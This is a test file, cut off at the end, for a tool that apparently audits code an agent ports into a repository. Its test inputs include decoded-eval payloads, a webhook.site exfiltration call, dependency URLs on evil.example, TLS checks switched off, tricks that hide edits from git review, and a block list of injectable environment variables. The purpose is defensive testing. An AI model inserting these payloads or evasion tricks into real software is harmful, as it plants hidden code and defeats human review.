import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { rm } from "node:fs/promises";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { scanBackend } from "../src/analysis/backend.js";
import { buildGraph } from "../src/analysis/graph.js";
import { extractImports } from "../src/analysis/imports.js";
import { checkLicense, identifyLicenseText, resolveExpression } from "../src/analysis/license.js";
import { parseManifest } from "../src/analysis/manifests.js";
import { scanRepository, scanText } from "../src/analysis/security.js";
import { loadConfig } from "../src/config.js";
import { fetchSnapshot, parseSource } from "../src/repo/fetch.js";
import { walkRepo } from "../src/repo/walk.js";
import type { EvidenceInput, TransplantPlan } from "../src/session/schema.js";
import { loadSession } from "../src/session/store.js";
import { checkUpstream } from "../src/session/upstream.js";
import {
  assertLocalEnv,
  failingTests,
  failureSignature,
  missingTools,
  narrowedChecks,
  needsBrowserCheck,
} from "../src/session/verify.js";
import {
  approvalSummary,
  approvePlan,
  auditSession,
  baselineSession,
  cleanupSession,
  commitSession,
  openWorkspace,
  recordEvidence,
  recordPlan,
  recordSpec,
  reportSession,
  startSession,
  traceSession,
  verifySession,
} from "../src/session/workflow.js";
import {
  assertGitRepo,
  commitReviewed,
  createWorkspace,
  readTargetState,
  reviewTree,
  syncRunDirectory,
  workspaceFingerprint,
} from "../src/session/workspace.js";
import { scrubbedEnv } from "../src/util/exec.js";
import { sha256 } from "../src/util/fsx.js";
import { createRepo, GPL3_TEXT, gitIn, MIT_TEXT, tempDir, testConfig, writeFiles } from "./helpers.js";

const config = testConfig();
const MAX = 1_000_000;

const SOURCE = {
  LICENSE: MIT_TEXT,
  "src/a.js": "exports.a = 1;\n",
};
const TARGET = {
  "package.json": '{"name":"t","private":true,"scripts":{"test":"node --test"}}',
  "src/app.js": "module.exports = 1;\n",
  "src/auth.js": "module.exports = { check: true };\n",
  ".gitignore": "node_modules/\n.env\n",
};
const SPEC = {
  name: "A",
  summary: "Adds A.",
  in_scope: ["A"],
  behaviors: ["A works"],
  acceptance_criteria: [
    { id: "AC-1", given: "x", when: "y", then: "z", verification: "unit" },
    { id: "AC-2", given: "x", when: "y", then: "looks right", verification: "visual" },
    { id: "AC-3", given: "x", when: "y", then: "mail arrives", verification: "manual" },
  ],
};
const IMPLEMENTATION = {
  "src/a.js": "exports.value = 1;\n",
  "tests/a.test.js": `require('node:test').test('value is one', () => {});\n`,
};
const planWith = (overrides: Record<string, unknown> = {}) => ({
  approach: "Port.",
  files: [
    { path: "src/a.js", action: "create", purpose: "A", acceptance_criteria: ["AC-1", "AC-2", "AC-3"] },
    { path: "tests/a.test.js", action: "create", purpose: "T", acceptance_criteria: ["AC-1"] },
  ],
  dependencies: { add: [] },
  verification: {
    commands: [
      { name: "lint", command: `node -e "console.log('clean lint output')"`, kind: "lint" },
      { name: "unit", command: "node --test --test-reporter=spec", kind: "test" },
    ],
  },
  rollback: "Delete the branch.",
  ...overrides,
});

async function workspaceFor(
  plan = planWith(),
  target: Record<string, string> = TARGET,
  settings = config,
  folderPrefix?: string,
) {
  const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), settings, true), settings);
  const repo = createRepo(target, folderPrefix);
  const session = await startSession(settings, { snapshot_id: snapshot.id, target_path: repo, feature: "A" });
  await traceSession(settings, session.id, { seeds: ["src/a.js"] });
  await recordSpec(settings, session.id, SPEC);
  const planned = await recordPlan(settings, session.id, plan);
  await approvePlan(settings, session.id, {
    plan_hash: planned.planHash!,
    user_confirmation: "yes",
    via: "agent_attested",
  });
  const opened = await openWorkspace(settings, session.id);
  return { id: session.id, worktree: opened.workspace!.path, workspace: opened.workspace!, repo };
}

const ALL_EVIDENCE: EvidenceInput[] = [
  {
    acceptance_criterion: "AC-1",
    status: "pass",
    kind: "test",
    command_name: "unit",
    log_contains: "value is one",
    detail: "unit test",
  },
  { acceptance_criterion: "AC-2", status: "manual_required", kind: "manual_note", detail: "person" },
  { acceptance_criterion: "AC-3", status: "manual_required", kind: "manual_note", detail: "person" },
];

const auditRules = async (id: string): Promise<string[]> => {
  const { session } = await auditSession(config, id);
  return session.audit!.findings.map((item) => item.rule);
};

describe("evidence cannot be skipped", () => {
  async function verified() {
    const context = await workspaceFor();
    writeFiles(context.worktree, IMPLEMENTATION);
    await auditSession(config, context.id);
    await verifySession(config, context.id, {});
    return context;
  }
  const base = { acceptance_criterion: "AC-1", detail: "claim" };

  it("will not take a screenshot for a criterion that needs a test", async () => {
    const { id } = await verified();
    await expect(
      recordEvidence(config, id, [{ ...base, status: "pass", kind: "screenshot" }]),
    ).rejects.toMatchObject({
      code: "evidence_incomplete",
    });
  });

  it("will not leave an automated criterion to a person", async () => {
    const { id } = await verified();
    await expect(
      recordEvidence(config, id, [{ ...base, status: "manual_required", kind: "manual_note" }]),
    ).rejects.toMatchObject({ code: "evidence_invalid" });
  });

  it("rejects a quote that matches anything, the echoed command, or a non-test run", async () => {
    const { id } = await verified();
    const test = { ...base, status: "pass", kind: "test", command_name: "unit" } as const;
    await expect(recordEvidence(config, id, [{ ...test, log_contains: "$" }])).rejects.toMatchObject({
      code: "evidence_invalid",
    });
    await expect(
      recordEvidence(config, id, [{ ...test, log_contains: "node --test" }]),
    ).rejects.toMatchObject({ code: "evidence_invalid" });
    await expect(
      recordEvidence(config, id, [{ ...test, command_name: "lint", log_contains: "clean lint output" }]),
    ).rejects.toThrow(/not a test run/);
  });

  it("accepts each criterion only in its own form", async () => {
    const { id } = await verified();
    await expect(
      recordEvidence(config, id, [
        { acceptance_criterion: "AC-2", status: "pass", kind: "manual_note", detail: "fine" },
      ]),
    ).rejects.toThrow(/needs a screenshot/);
    await expect(
      recordEvidence(config, id, [
        { acceptance_criterion: "AC-3", status: "pass", kind: "screenshot", detail: "fine" },
      ]),
    ).rejects.toThrow(/needs a manual_note/);
    const state = await recordEvidence(config, id, [
      {
        acceptance_criterion: "AC-1",
        status: "pass",
        kind: "test",
        command_name: "unit",
        log_contains: "value is one",
        detail: "t",
      },
      { acceptance_criterion: "AC-2", status: "pass", kind: "screenshot", detail: "shot" },
      {
        acceptance_criterion: "AC-3",
        status: "manual_required",
        kind: "manual_note",
        detail: "Check a real inbox",
      },
    ]);
    expect(state.evidence).toHaveLength(3);
    const { result } = await reportSession(config, id, false);
    expect(result.status).toBe("complete");
    expect(result.markdown).toContain("AC-3: Check a real inbox");
    expect(result.markdown).toContain("Plan approval: recorded by the agent");
  });
});

describe("the audit sees what git hides", () => {
  it("catches ignored files, including a real .env", async () => {
    const { id, worktree } = await workspaceFor();
    const before = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "src/hidden/.gitignore": "*\n",
      "src/hidden/evil.js": "bad\n",
      ".env": "K=1\n",
    });
    const rules = await auditRules(id);
    expect(rules).toContain("secrets.env_file");
    const session = await loadSession(config, id);
    const files = session.audit!.findings.map((item) => item.file);
    expect(files).toEqual(expect.arrayContaining(["src/hidden/evil.js", ".env"]));
    expect(before).toBeDefined();
  });

  it("fingerprints ignored files, but not installed packages", async () => {
    const { worktree, workspace } = await workspaceFor();
    const start = await workspaceFingerprint(workspace);
    writeFiles(worktree, { "node_modules/a/index.js": "x", "packages/b/node_modules/c.js": "y" });
    expect(await workspaceFingerprint(workspace)).toBe(start);
    writeFiles(worktree, { "src/hidden/.gitignore": "*\n", "src/hidden/evil.js": "bad\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(start);
  });

  it("does not treat other paths under .transplant as tool output", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    const start = await workspaceFingerprint(workspace);
    writeFiles(worktree, { ...IMPLEMENTATION, ".transplant/lib/real.js": "eval(atob(payload))\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(start);
    const rules = await auditRules(id);
    expect(rules).toEqual(expect.arrayContaining(["scope.unplanned_file", "exec.eval_decoded"]));
  });

  it.each([["--skip-worktree"], ["--assume-unchanged"]])("sees edits flagged %s", async (flag) => {
    const { id, worktree, workspace } = await workspaceFor();
    const start = await workspaceFingerprint(workspace);
    gitIn(worktree, "update-index", flag, "src/auth.js");
    writeFiles(worktree, { "src/auth.js": "module.exports = { check: false };\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(start);
    expect(await auditRules(id)).toContain("scope.unplanned_file");
  });

  it("ignores diff.external and attributes in repository config", async () => {
    const { worktree, workspace, id, repo } = await workspaceFor();
    gitIn(repo, "config", "diff.external", "false");
    const common = path.join(repo, ".git", "info");
    mkdirSync(common, { recursive: true });
    writeFileSync(path.join(common, "attributes"), "*.js -diff\n");
    const first = await workspaceFingerprint(workspace);
    writeFiles(worktree, { "src/auth.js": "eval(atob(payload));\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(first);
    expect(await auditRules(id)).toContain("exec.eval_decoded");
  });

  it("is not fooled by a line that looks like a diff header", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "src/a.js": "/*\n++ /dev/null\n*/\neval(atob(payload));\nhttp.get({ rejectUnauthorized: false });\n",
    });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["exec.eval_decoded", "security.weakened_protection"]),
    );
  });

  it("does not let a NUL byte exempt a file", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/a.js": "/*\0*/ eval(atob(payload));\n" });
    expect(await auditRules(id)).toEqual(expect.arrayContaining(["exec.eval_decoded"]));
  });

  it("flags binaries the plan does not declare", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/tool.bin": "MZ\0\0payload" });
    expect(await auditRules(id)).toContain("scope.binary_file");
  });

  it("stays accurate with a file past the capture limit next to a real edit", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "a_big.txt": "x".repeat(34 * 1024 * 1024) });
    const first = await workspaceFingerprint(workspace);
    writeFiles(worktree, { "src/auth.js": "module.exports = { check: false };\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(first);
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["scope.file_too_large", "scope.unplanned_file"]),
    );
  });

  it("flags nested repositories, whose contents git does not store", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "lib/inner.js": "x\n" });
    gitIn(path.join(worktree, "lib"), "init", "-q");
    gitIn(path.join(worktree, "lib"), "add", "-A");
    gitIn(path.join(worktree, "lib"), "-c", "user.name=a", "-c", "user.email=a@b", "commit", "-q", "-m", "x");
    expect(await auditRules(id)).toContain("scope.nested_repository");
  });

  it("reports the real line of a finding", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/a.js": `${"// pad\n".repeat(24)}eval(atob(x));\n` });
    await auditSession(config, id);
    const session = await loadSession(config, id);
    expect(session.audit!.findings.find((item) => item.rule === "exec.eval_decoded")?.line).toBe(25);
  });

  it("does not credit a planned modify with a deletion", async () => {
    const plan = planWith({
      files: [
        { path: "src/app.js", action: "modify", purpose: "A", acceptance_criteria: ["AC-1", "AC-2", "AC-3"] },
      ],
    });
    const { id, worktree } = await workspaceFor(plan);
    gitIn(worktree, "rm", "-q", "src/app.js");
    expect(await auditRules(id)).toContain("scope.deleted_planned_file");
  });

  it("handles non-ASCII filenames", async () => {
    const plan = planWith({
      files: [
        {
          path: "src/기능.js",
          action: "create",
          purpose: "A",
          acceptance_criteria: ["AC-1", "AC-2", "AC-3"],
        },
      ],
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, { "src/기능.js": "exports.a = 1;\n" });
    const { session } = await auditSession(config, id);
    expect(session.audit!.findings).toEqual([]);
  });

  it("does not exempt a migration because its name contains down", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "db/001_markdown.sql": "DROP TABLE users;\n",
      "db/002.down.sql": "DROP TABLE x;\n",
    });
    await auditSession(config, id);
    const session = await loadSession(config, id);
    const destructive = session.audit!.findings.filter(
      (item) => item.rule === "database.destructive_statement",
    );
    expect(destructive.map((item) => item.file)).toEqual(["db/001_markdown.sql"]);
  });

  it("checks long lines and test files", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      "src/a.js": `const q = "DROP TABLE users"; // ${"x".repeat(3000)}\n`,
      "tests/a.test.js": "fetch('https://webhook.site/x');\n",
    });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["database.destructive_statement", "exfil.drop_endpoint"]),
    );
  });
});

describe("dependency audit", () => {
  const add = (version: string) => ({
    dependencies: { add: [{ name: "lodash", version, ecosystem: "npm", reason: "x" }] },
  });

  it("binds the approved version", async () => {
    const { id, worktree } = await workspaceFor(planWith(add("4.17.21")));
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "package.json":
        '{"name":"t","private":true,"scripts":{"test":"node --test"},"dependencies":{"lodash":"https://evil.example/l.tgz"}}',
    });
    expect(await auditRules(id)).toContain("dependency.version_mismatch");
  });

  it("flags changed scripts and overrides in an unplanned package.json", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "package.json": '{"name":"t","private":true,"scripts":{"test":"node evil.js"},"overrides":{"a":"1"}}',
    });
    expect(await auditRules(id)).toContain("manifest.unplanned_change");
  });

  it("flags a new nested manifest and a lockfile pointing elsewhere", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "packages/x/package.json": '{"name":"x"}',
      "package-lock.json": '{"packages":{"a":{"resolved":"https://evil.example/a.tgz"}}}',
    });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["scope.unplanned_file", "supply_chain.unusual_registry"]),
    );
  });

  it("flags requirements lines that change the package source", async () => {
    const { id, worktree } = await workspaceFor(planWith(), {
      ...TARGET,
      "requirements.txt": "flask==3.0\n",
    });
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "requirements.txt": "flask==3.0\n--extra-index-url https://evil.example/simple\n",
    });
    expect(await auditRules(id)).toContain("dependency.remote_source");
  });

  it("parses CRLF and long-form Cargo manifests", () => {
    const names = (text: string): string[] => parseManifest("Cargo.toml", text).map((dep) => dep.name);
    expect(names('[dependencies]\r\nserde = "1"\r\n')).toEqual(["serde"]);
    expect(names('[build-dependencies]\ncc = "1"\n[dependencies.tokio]\nversion = "1"\n').sort()).toEqual([
      "cc",
      "tokio",
    ]);
  });
});

describe("verification", () => {
  it("does not credit code that a command rewrote", async () => {
    const plan = planWith({
      verification: {
        commands: [
          {
            name: "unit",
            command: `node -e "require('fs').writeFileSync('src/a.js','changed')" && node --test --test-reporter=spec`,
            kind: "test",
          },
        ],
      },
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, IMPLEMENTATION);
    const { results } = await verifySession(config, id, {});
    expect(results[0]?.status).toBe("modified_files");
  });

  it.each([
    ["10 passing", "passed"],
    ["120 passing", "passed"],
    ["10 tests run", "passed"],
    ["0 passing", "no_tests_ran"],
    ["running 0 tests", "no_tests_ran"],
    ["ℹ tests 0", "no_tests_ran"],
    ["?   example.com/x [no test files]", "no_tests_ran"],
    ["ok example.com/y 0.1s\\n?   example.com/x [no test files]", "passed"],
  ])("reads %j as %s", async (output, expected) => {
    const plan = planWith({
      verification: {
        commands: [{ name: "unit", command: `node -e "console.log('${output}')"`, kind: "test" }],
      },
    });
    const { id } = await workspaceFor(plan);
    const { results } = await verifySession(config, id, {});
    expect(results[0]?.status).toBe(expected);
  });

  it("uses an allowlisted environment and a throwaway home", () => {
    const env = scrubbedEnv(
      {
        PATH: "/bin",
        HOME: "/home/me",
        DB_PASS: "x",
        MYSQL_PWD: "x",
        GITHUB_PAT: "x",
        POSTGRES_URL: "x",
        CONNECTION_STRING: "x",
        ANTHROPIC_KEY: "x",
      },
      "/tmp/rt-home",
    );
    expect(env.HOME).toBe("/tmp/rt-home");
    expect(Object.keys(env)).not.toEqual(expect.arrayContaining(["DB_PASS"]));
    expect(JSON.stringify(env)).not.toMatch(/"x"/);
  });

  const command = (env: Record<string, string>, text = "migrate", kind = "migration" as const) => ({
    name: "m",
    command: text,
    kind,
    timeout_s: 60,
    env,
  });

  it.each([
    [{ DATABASE_URL: "postgres://u:p@localhost/db?host=prod.example.com" }],
    [{ DATABASE_URL: "postgres://localhost:5432,prod.example.com:5432/db" }],
    [{ PGHOST: "prod.example.com" }],
    [{ DSN: "host=prod.example.com user=a" }],
    [{ MONGO: "mongodb+srv://u:p@cluster.example.net/db" }],
  ])("refuses remote targets in %j", (env) => {
    expect(() => assertLocalEnv(command(env))).toThrow(/prod\.example\.com|cluster\.example\.net/);
  });

  it("refuses remote databases named in the command, and allows local ones", () => {
    expect(() => assertLocalEnv(command({}, "psql postgres://u@prod.example.com/db"))).toThrow(
      /prod\.example\.com/,
    );
    expect(() =>
      assertLocalEnv(command({ DATABASE_URL: "postgres://u:p@127.0.0.1:5432/db", PGHOST: "localhost" })),
    ).not.toThrow();
    expect(() => assertLocalEnv(command({ SQLITE: "file:./dev.db" }))).not.toThrow();
  });

  it.each([["NODE_OPTIONS"], ["LD_PRELOAD"], ["PATH"], ["PYTHONPATH"], ["GIT_DIR"], ["BASH_ENV"]])(
    "refuses to let a plan set %s",
    (name) => {
      expect(() => assertLocalEnv(command({ [name]: "./x" }))).toThrow(/cannot be set/);
    },
  );

  it("shows command env in the approval summary", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const session = await startSession(config, {
      snapshot_id: snapshot.id,
      target_path: createRepo(TARGET),
      feature: "A",
    });
    await traceSession(config, session.id, { seeds: ["src/a.js"] });
    await recordSpec(config, session.id, SPEC);
    const planned = await recordPlan(
      config,
      session.id,
      planWith({
        verification: {
          commands: [{ name: "unit", command: "npm test", kind: "test", env: { LOG_LEVEL: "debug" } }],
        },
      }),
    );
    const summary = approvalSummary(planned);
    expect(summary).toContain("LOG_LEVEL=debug npm test");
    expect(summary).toContain("can still read your files");
    expect(summary).toContain("Base commit:");
  });

  it("rejects image names that would become docker flags", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const session = await startSession(config, {
      snapshot_id: snapshot.id,
      target_path: createRepo(TARGET),
      feature: "A",
    });
    await traceSession(config, session.id, { seeds: ["src/a.js"] });
    await recordSpec(config, session.id, SPEC);
    const base = planWith();
    await expect(
      recordPlan(config, session.id, {
        ...base,
        verification: { ...base.verification, docker_image: "--privileged" },
      }),
    ).rejects.toThrow();
  });

  it("runs commands in a copy of the reviewed files, with no .git, keeping installed packages", async () => {
    const { worktree, workspace } = await workspaceFor();
    const copy = path.join(tempDir(), "work");
    writeFiles(worktree, { ...IMPLEMENTATION, "node_modules/forged/index.js": "x", ".env.local": "A=1\n" });
    await syncRunDirectory(workspace, copy);
    writeFiles(copy, { "node_modules/keep.js": "y", "stale.js": "z" });
    await syncRunDirectory(workspace, copy);
    expect(existsSync(path.join(copy, ".git"))).toBe(false);
    expect(existsSync(path.join(copy, "stale.js"))).toBe(false);
    expect(existsSync(path.join(copy, "node_modules/forged/index.js"))).toBe(false);
    expect(readFileSync(path.join(copy, "node_modules/keep.js"), "utf8")).toBe("y");
    expect(readFileSync(path.join(copy, "src/a.js"), "utf8")).toBe(IMPLEMENTATION["src/a.js"]);
  });
});

describe("second review: code hiding from the review", () => {
  it("sees ignored files under build-style names away from a manifest", async () => {
    const { id, worktree, workspace, repo } = await workspaceFor();
    const start = await workspaceFingerprint(workspace);
    writeFiles(path.join(repo, ".git", "info"), { exclude: "src/coverage/\n" });
    writeFiles(worktree, {
      "src/target/.gitignore": "*\n",
      "src/target/evil.js": "bad\n",
      "src/coverage/evil.js": "bad\n",
    });
    expect(await workspaceFingerprint(workspace)).not.toBe(start);
    await auditSession(config, id);
    const session = await loadSession(config, id);
    const files = session.audit!.findings.map((item) => item.file);
    expect(files).toEqual(expect.arrayContaining(["src/target/evil.js", "src/coverage/evil.js"]));
  });

  it("keeps committable files under a build name in scope", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { "dist/evil.js": "bad\n" });
    await auditSession(config, id);
    const session = await loadSession(config, id);
    expect(session.audit!.findings.map((item) => item.file)).toContain("dist/evil.js");
  });

  it("flags a .git directory hiding code, and tracks edits inside it", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/lib/.git/impl.js": "one\n" });
    const first = await workspaceFingerprint(workspace);
    expect(await auditRules(id)).toContain("scope.nested_repository");
    writeFiles(worktree, { "src/lib/.git/impl.js": "two\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(first);
  });

  it("ignores clean filters, a decoy worktree and a rewritten .git file", async () => {
    const { id, worktree, workspace, repo } = await workspaceFor();
    const start = await workspaceFingerprint(workspace);
    gitIn(repo, "config", "filter.x.clean", "git show HEAD:src/auth.js");
    writeFiles(path.join(repo, ".git", "info"), { attributes: "src/auth.js filter=x\n" });
    writeFiles(worktree, { "src/auth.js": "eval(atob(payload));\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(start);
    expect(await auditRules(id)).toContain("exec.eval_decoded");

    const decoy = tempDir();
    await rm(path.join(worktree, ".git"), { force: true });
    writeFileSync(path.join(worktree, ".git"), `gitdir: ${decoy}\n`);
    expect(await auditRules(id)).toContain("exec.eval_decoded");
  });

  it("exempts tool files only while they match what the tool wrote", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "THIRD_PARTY_NOTICES.md": "eval(atob(x));\n" });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["scope.unplanned_file", "exec.eval_decoded"]),
    );
    writeFiles(worktree, IMPLEMENTATION);
    const session = await loadSession(config, id);
    const report = path.join(worktree, ".transplant/reports", `${id}.md`);
    writeFiles(worktree, { [`.transplant/reports/${id}.md`]: "report" });
    const withFile = await workspaceFingerprint(workspace);
    const exempt = await workspaceFingerprint({
      ...session.workspace!,
      toolFiles: { [`.transplant/reports/${id}.md`]: sha256("report") },
    });
    expect(exempt).not.toBe(withFile);
    writeFileSync(report, "edited");
    const edited = await workspaceFingerprint({
      ...session.workspace!,
      toolFiles: { [`.transplant/reports/${id}.md`]: sha256("report") },
    });
    expect(edited).not.toBe(exempt);
  });

  it("does not exempt a lockfile away from a manifest, and scans lockfile text", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/x/yarn.lock": "eval(atob(payload));\n" });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["scope.unplanned_file", "exec.eval_decoded"]),
    );
  });

  it("treats moved and duplicated lines as added", async () => {
    const original =
      "const dev = { a: 1,\n  rejectUnauthorized: false,\n};\nconst prod = {\n};\neval(atob(cfg));\n";
    const { id, worktree } = await workspaceFor(
      planWith({
        files: [
          {
            path: "src/app.js",
            action: "modify",
            purpose: "A",
            acceptance_criteria: ["AC-1", "AC-2", "AC-3"],
          },
        ],
      }),
      { ...TARGET, "src/app.js": original },
    );
    writeFiles(worktree, {
      "src/app.js":
        "const dev = { a: 1,\n};\nconst prod = {\n  rejectUnauthorized: false,\n};\neval(atob(cfg));\neval(atob(cfg));\n",
    });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["security.weakened_protection", "exec.eval_decoded"]),
    );
  });

  it("finds a payload behind long padding", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "src/a.js": `${" ".repeat(4100)}http.get({ rejectUnauthorized: false }); eval(atob(x));\n`,
    });
    expect(await auditRules(id)).toEqual(
      expect.arrayContaining(["security.weakened_protection", "exec.eval_decoded", "obfuscation.long_line"]),
    );
  });

  it("does not fail a run for writing an ignored cache", async () => {
    const plan = planWith({
      verification: {
        commands: [
          {
            name: "unit",
            command: `node -e "require('fs').writeFileSync('.eslintcache','x')" && node --test --test-reporter=spec`,
            kind: "test",
          },
        ],
      },
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, IMPLEMENTATION);
    const { results } = await verifySession(config, id, {});
    expect(results[0]?.status).toBe("passed");
  });

  it("writes nothing into the target's object store while fingerprinting", async () => {
    const { worktree, workspace, repo } = await workspaceFor();
    writeFiles(worktree, { ".env": "STRIPE_SECRET=sk_live_abcdefghijklmnopqrstuv\n" });
    await workspaceFingerprint(workspace);
    const hash = gitIn(worktree, "hash-object", ".env").trim();
    expect(() => gitIn(repo, "cat-file", "-e", hash)).toThrow();
  });

  it("flags scripts and overrides even in a planned package.json", async () => {
    const plan = planWith({
      files: [
        ...planWith().files,
        { path: "package.json", action: "modify", purpose: "Add a script", acceptance_criteria: [] },
      ],
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "package.json":
        '{"name":"t","private":true,"scripts":{"test":"node --test","pretest":"node x.js"},"overrides":{"a":"1"}}',
    });
    expect(await auditRules(id)).toContain("manifest.sensitive_change");
  });

  it("flags edits to other manifests that are not dependencies", async () => {
    const { id, worktree } = await workspaceFor(planWith(), {
      ...TARGET,
      "Cargo.toml": '[package]\nname = "a"\n',
    });
    writeFiles(worktree, { ...IMPLEMENTATION, "Cargo.toml": '[package]\nname = "a"\nbuild = "evil.rs"\n' });
    expect(await auditRules(id)).toContain("manifest.unplanned_change");
  });

  it("rejects reporter vocabulary as evidence", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    await auditSession(config, id);
    await verifySession(config, id, {});
    await expect(
      recordEvidence(config, id, [
        {
          acceptance_criterion: "AC-1",
          status: "pass",
          kind: "test",
          command_name: "unit",
          log_contains: "duration_ms",
          detail: "x",
        },
      ]),
    ).rejects.toMatchObject({ code: "evidence_invalid" });
  });

  const envCommand = (env: Record<string, string>, text = "npm test") => ({
    name: "m",
    command: text,
    kind: "test" as const,
    timeout_s: 60,
    env,
  });

  it.each([
    [{ DATABASE_URL: "postgres://localhost,prod.example.com/db" }],
    [{ DATABASE_URL: "jdbc:postgresql://prod.example.com/db" }],
    [{ DSN: "root:pw@tcp(prod.example.com:3306)/db" }],
    [{ REDIS: "//prod.example.com:6379" }],
    [{ DATABASE_URL: "prod.example.com/db" }],
    [{ DATABASE_URL: "postgres://localhost/db?h%6fst=prod.example.com" }],
    [{ DB_HOSTNAME: "prod.example.com" }],
    [{ DB_HOSTS: "prod.example.com" }],
  ])("refuses %j", (env) => {
    expect(() => assertLocalEnv(envCommand(env))).toThrow(/prod\.example\.com/);
  });

  it.each([
    ["psql -h prod.example.com"],
    ["PGHOST=prod.example.com npm run migrate"],
    ["x jdbc:mysql://prod.example.com/db"],
  ])("refuses the command %s", (text) => {
    expect(() => assertLocalEnv(envCommand({}, text))).toThrow(/prod\.example\.com/);
  });

  it.each([
    [{ DATABASE_URL: "postgres://[::1]/db" }],
    [{ DB_HOST: "localhost:5432" }],
    [{ REDIS_ADDR: "localhost:6379" }],
    [{ ASPECT: "16:9" }],
    [{ TIMEOUT: "0:30" }],
    [{ PORTS: "3000:3000" }],
    [{ DATABASE_URL: ":memory:" }],
    [{ DATABASE_URL: "file:./dev.db" }],
  ])("allows %j", (env) => {
    expect(() => assertLocalEnv(envCommand(env))).not.toThrow();
  });

  it.each([
    ["node_options"],
    ["Node_Options"],
    ["_JAVA_OPTIONS"],
    ["DOTNET_STARTUP_HOOKS"],
    ["RUSTC_WRAPPER"],
    ["PATHEXT"],
    ["PGSERVICE"],
  ])("refuses to let a plan set %s", (name) => {
    expect(() => assertLocalEnv(envCommand({ [name]: "x" }))).toThrow(/cannot be set/);
  });
});

describe("third review: what survived the redesign", () => {
  const withInstall = planWith({
    verification: {
      commands: [
        {
          name: "unit",
          command: `node -e "const f=require('fs');f.mkdirSync('node_modules/forged',{recursive:true});f.writeFileSync('node_modules/forged/index.js','1')" && node --test --test-reporter=spec`,
          kind: "test",
        },
      ],
    },
  });

  it("drops anything a run left behind once the code changes", async () => {
    const { id, worktree, workspace } = await workspaceFor(withInstall);
    const runDir = path.join(tempDir(), "work");
    writeFiles(runDir, { "node_modules/forged/index.js": "1" });
    writeFiles(worktree, IMPLEMENTATION);
    await syncRunDirectory(workspace, runDir);
    expect(existsSync(path.join(runDir, "node_modules/forged/index.js"))).toBe(false);
    writeFiles(runDir, { "node_modules/forged/index.js": "1" });
    await syncRunDirectory(workspace, runDir);
    expect(existsSync(path.join(runDir, "node_modules/forged/index.js"))).toBe(true);
    writeFiles(worktree, { "src/a.js": "require('forged');\n" });
    await syncRunDirectory(workspace, runDir);
    expect(existsSync(path.join(runDir, "node_modules/forged/index.js"))).toBe(false);
    expect(id).toBeTruthy();
  });

  it("will not write reviewed files through a planted link, or keep a kept name that is a file", async () => {
    const { worktree, workspace } = await workspaceFor();
    const runDir = path.join(tempDir(), "work");
    writeFiles(worktree, { ...IMPLEMENTATION, "target/keys": "reviewed\n" });
    await syncRunDirectory(workspace, runDir);
    writeFiles(runDir, { "target/stale": "x" });
    await syncRunDirectory(workspace, runDir);
    expect(existsSync(path.join(runDir, "target/stale"))).toBe(false);
    expect(readFileSync(path.join(runDir, "target/keys"), "utf8")).toBe("reviewed\n");
  });

  it("makes install runs expire with the code", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    await auditSession(config, id);
    await verifySession(config, id, {});
    writeFiles(worktree, { "src/a.js": "exports.value = 2;\n" });
    const { state } = await reportSession(config, id, true);
    expect(state.blockers.join("\n")).toMatch(/changed after verification lint/);
  });

  it("treats a lone CR as a real edit, while CRLF of the same text is not", async () => {
